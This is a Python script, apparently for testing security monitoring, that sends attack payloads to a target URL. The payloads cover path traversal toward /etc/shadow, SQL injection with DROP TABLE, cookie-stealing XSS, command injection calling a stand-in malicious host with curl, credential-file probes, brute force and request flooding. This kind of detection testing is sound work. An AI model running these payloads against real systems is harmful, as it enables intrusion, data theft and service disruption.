#!/usr/bin/env python3
"""
Web Application Attack Simulation
Simulates common web attacks to test security monitoring
"""

import requests
import time
import sys
from urllib.parse import urljoin

class WebAttackSimulator:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        
    def print_test(self, message):
        print(f"\n[TEST] {message}")
        
    def print_result(self, status_code, message):
        color = '\033[92m' if status_code < 400 else '\033[91m'
        reset = '\033[0m'
        print(f"{color}[{status_code}]{reset} {message}")
        
    def test_path_traversal(self):
        """Test 1: Path Traversal Attack"""
        self.print_test("Path Traversal Attack")
        payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            '....//....//....//etc/passwd',
            '/app/../../../../etc/shadow'
        ]
        
        for payload in payloads:
            try:
                url = urljoin(self.base_url, f'/api/files?dir={payload}')
                response = self.session.get(url, timeout=5)
                self.print_result(response.status_code, f"Path traversal: {payload}")
                time.sleep(0.5)
            except Exception as e:
                print(f"Error: {e}")
                
    def test_sql_injection(self):
        """Test 2: SQL Injection Attempts"""
        self.print_test("SQL Injection Attempts")
        payloads = [
            "' OR '1'='1",
            "admin' --",
            "1' UNION SELECT NULL--",
            "'; DROP TABLE users--"
        ]
        
        for payload in payloads:
            try:
                url = urljoin(self.base_url, '/api/data')
                data = {'query': payload}
                response = self.session.post(url, json=data, timeout=5)
                self.print_result(response.status_code, f"SQL injection: {payload}")
                time.sleep(0.5)
            except Exception as e:
                print(f"Error: {e}")
                
    def test_xss(self):
        """Test 3: Cross-Site Scripting (XSS)"""
        self.print_test("Cross-Site Scripting (XSS)")
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(document.cookie)',
            '<svg/onload=alert("XSS")>'
        ]
        
        for payload in payloads:
            try:
                url = urljoin(self.base_url, '/api/data')
                data = {'input': payload}
                response = self.session.post(url, json=data, timeout=5)
                self.print_result(response.status_code, f"XSS attempt: {payload[:30]}...")
                time.sleep(0.5)
            except Exception as e:
                print(f"Error: {e}")
                
    def test_command_injection(self):
        """Test 4: Command Injection"""
        self.print_test("Command Injection")
        payloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '`whoami`',
            '$(curl http://malicious.com)'
        ]
        
        for payload in payloads:
            try:
                url = urljoin(self.base_url, '/api/data')
                data = {'command': payload}
                response = self.session.post(url, json=data, timeout=5)
                self.print_result(response.status_code, f"Command injection: {payload}")
                time.sleep(0.5)
            except Exception as e:
                print(f"Error: {e}")
                
    def test_bruteforce(self):
        """Test 5: Brute Force Attack Simulation"""
        self.print_test("Brute Force Attack (Rate Limiting Test)")
        
        for i in range(20):
            try:
                url = urljoin(self.base_url, '/api/data')
                data = {'username': f'admin{i}', 'password': 'password123'}
                response = self.session.post(url, json=data, timeout=5)
                self.print_result(response.status_code, f"Attempt {i+1}/20")
                time.sleep(0.1)
            except Exception as e:
                print(f"Error: {e}")
                
    def test_ddos_simulation(self):
        """Test 6: DDoS Simulation (Light)"""
        self.print_test("DDoS Simulation (Light Load)")
        
        for i in range(50):
            try:
                response = self.session.get(self.base_url, timeout=2)
                if i % 10 == 0:
                    self.print_result(response.status_code, f"Request {i+1}/50")
                time.sleep(0.05)
            except Exception as e:
                if i % 10 == 0:
                    print(f"Error: {e}")
                    
    def test_sensitive_data_exposure(self):
        """Test 7: Sensitive Data Exposure Attempts"""
        self.print_test("Sensitive Data Exposure Attempts")
        paths = [
            '/.env',
            '/.git/config',
            '/config.yaml',
            '/secrets.json',
            '/api/keys',
            '/.aws/credentials'
        ]
        
        for path in paths:
            try:
                url = urljoin(self.base_url, path)
                response = self.session.get(url, timeout=5)
                self.print_result(response.status_code, f"Accessing: {path}")
                time.sleep(0.5)
            except Exception as e:
                print(f"Error: {e}")
                
    def test_insecure_deserialization(self):
        """Test 8: Insecure Deserialization"""
        self.print_test("Insecure Deserialization")
        
        malicious_payloads = [
            {'__class__': {'__init__': {'__globals__': {}}}},
            {'pickle': 'malicious_serialized_data'},
        ]
        
        for payload in malicious_payloads:
            try:
                url = urljoin(self.base_url, '/api/data')
                response = self.session.post(url, json=payload, timeout=5)
                self.print_result(response.status_code, "Deserialization attempt")
                time.sleep(0.5)
            except Exception as e:
                print(f"Error: {e}")
                
    def run_all_tests(self):
        """Run all attack simulations"""
        print("="*60)
        print("Web Application Attack Simulation")
        print("Target:", self.base_url)
        print("="*60)
        
        tests = [
            self.test_path_traversal,
            self.test_sql_injection,
            self.test_xss,
            self.test_command_injection,
            self.test_bruteforce,
            self.test_ddos_simulation,
            self.test_sensitive_data_exposure,
            self.test_insecure_deserialization
        ]
        
        for test in tests:
            try:
                test()
                time.sleep(1)
            except KeyboardInterrupt:
                print("\n\nAttack simulation interrupted!")
                sys.exit(0)
            except Exception as e:
                print(f"Test failed: {e}")
                
        print("\n" + "="*60)
        print("Attack Simulation Complete!")
        print("="*60)
        print("\nMonitor the following for security events:")
        print("  - Application logs")
        print("  - WAF logs (if configured)")
        print("  - Falco runtime alerts")
        print("  - CloudWatch metrics")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python3 web_attacks.py <target_url>")
        print("Example: python3 web_attacks.py http://your-alb-url.com")
        sys.exit(1)
        
    target_url = sys.argv[1]
    simulator = WebAttackSimulator(target_url)
    simulator.run_all_tests()